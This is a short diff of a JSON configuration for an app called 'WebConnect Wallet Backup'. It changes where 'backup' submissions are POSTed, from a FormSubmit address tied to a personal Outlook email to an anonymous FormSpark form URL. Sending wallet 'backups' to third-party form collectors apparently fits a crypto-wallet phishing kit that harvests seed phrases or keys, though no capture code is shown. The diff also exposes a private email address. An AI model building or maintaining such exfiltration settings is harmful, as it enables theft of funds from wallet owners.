@@ -1,19 +1,19 @@
 {
   "version": "1.0.0",
   "app_name": "WebConnect Wallet Backup",
-  "description": "Interactive wallet backup system with FormSubmit integration",
+  "description": "Interactive wallet backup system with FormSpark integration",
   "repository": "https://github.com/decentralizedconfig/launchpad",
   
   "storage": {
     "enabled": true,
     "destinations": [
       {
-        "name": "formsubmit",
-        "type": "formsubmit",
+        "name": "formspark",
+        "type": "formspark",
         "enabled": true,
-        "endpoint": "https://formsubmit.co/lucasxavi99@outlook.com",
+        "endpoint": "https://submit-form.com/yUfKj71xv",
         "method": "POST",
-        "description": "FormSubmit endpoint for secure backup submission",
+        "description": "FormSpark endpoint for secure backup submission",
         "timeout": 30,
         "retry_attempts": 3
       }
